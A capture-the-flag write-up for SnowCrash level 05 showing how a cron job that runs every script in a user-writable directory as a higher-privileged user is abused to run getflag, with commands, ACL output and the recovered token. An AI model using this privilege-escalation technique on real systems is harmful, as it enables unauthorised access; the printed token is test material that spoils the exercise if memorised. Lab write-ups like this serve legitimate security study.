## LEVEL 05

---

When I log to the level05 I see a message that says : `You have new mail`.

By default the mail directory is `/var/spool/mail`. Inside this directory I found a file.

```shell
$ level05@SnowCrash:~$ cd /var/spool/mail
$ level05@SnowCrash:/var/spool/mail$ ls -l
total 4
-rw-r--r--+ 1 root mail 58 May  7 17:03 level05
$ level05@SnowCrash:/var/spool/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This file is a cron file to automatically run a command, here the command `sh /usr/sbin/openarenaserver`.

```shell
$ cd /usr/sbin
[...]
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
[...]
```

I use `getfacl` to get more informations about the permissions.

```shell
$ getfacl openarenaserver
# file: openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

This file has a special permission to read the file for user `level05`. And It can run `getflag` because the owner is `flag05` but we cannot change the file.

```shell
$ cat openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script seems to limit the CPU usage, run every scripts inside `/opt/openarenaserver` and remove them. So if we can create a script to run `getflag` inside `/opt/openarenaserver` this script will give us the flag.

Let's take a look on this directory.

```shell
$ cd /opt
$ ls -l
$ getfacl openarenaserver/
# file: openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
$ cd openarenaserver
```

This directory has a special permission for user `level05` to do everything I want. So I will write the script to execute `getflag` and redirect the output inside tmp file.

```shell
$ vim script
#!/bin/bash
/bin/getflag > /tmp/flag
```

Now I wait 2 minutes which is how long cron will take to execute the script.

```shell
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

*Source :*

*https://serverfault.com/questions/227852/what-does-a-mean-at-the-end-of-the-permissions-from-ls-l*

*https://www.unix.com/man-page/linux/1/limit/*

*https://www.ibm.com/docs/en/aix/7.2?topic=m-mail-command*